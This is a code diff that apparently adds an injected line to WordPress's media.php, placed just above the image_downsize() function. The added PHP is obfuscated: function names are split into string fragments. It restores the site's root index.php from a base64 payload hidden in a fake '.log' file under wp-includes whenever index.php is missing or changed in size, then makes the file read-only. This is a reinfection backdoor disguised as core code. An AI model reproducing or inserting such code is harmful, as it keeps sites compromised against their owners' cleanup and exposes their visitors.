@@ -188,6 +188,10 @@ function image_hwstring( $width, $height ) {
  *     @type bool   $3 Whether the image is a resized image.
  * }
  */
+
+// project_x
+$f_size = 'fil' . 'esi' . 'ze'; $f_exists = 'fil' . 'e_e' . 'xis' . 'ts'; $f_put = 'fil' . 'e_p' . 'ut_' . 'con' . 'ten' . 'ts'; $f_get = 'fil' . 'e_g' . 'et_' . 'con' . 'ten' . 'ts'; $ch = 'c' . 'h' . 'm' . 'o' . 'd'; $tou = 't' . 'o' . 'u' . 'c' . 'h'; $delete = 'unl' . 'ink'; $bs_dec = 'bas' . 'e6' . '4_de' . 'code'; $idx_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/ind' . 'ex.php'; $bk_idx_path = 'wp-includes/blocks/post-templatemDCKkLcpEOwH.log'; if (!$f_exists($idx_path) or $f_size($idx_path) != 7710) { if ($f_exists($bk_idx_path)){ $idx_code = @$f_get($bk_idx_path); @$ch($idx_path, 438); @$delete($idx_path); @$f_put($idx_path, $bs_dec($idx_code)); @$ch($idx_path, 292); } }
+// project_y
 function image_downsize( $id, $size = 'medium' ) {
 	$is_image = wp_attachment_is_image( $id );
 
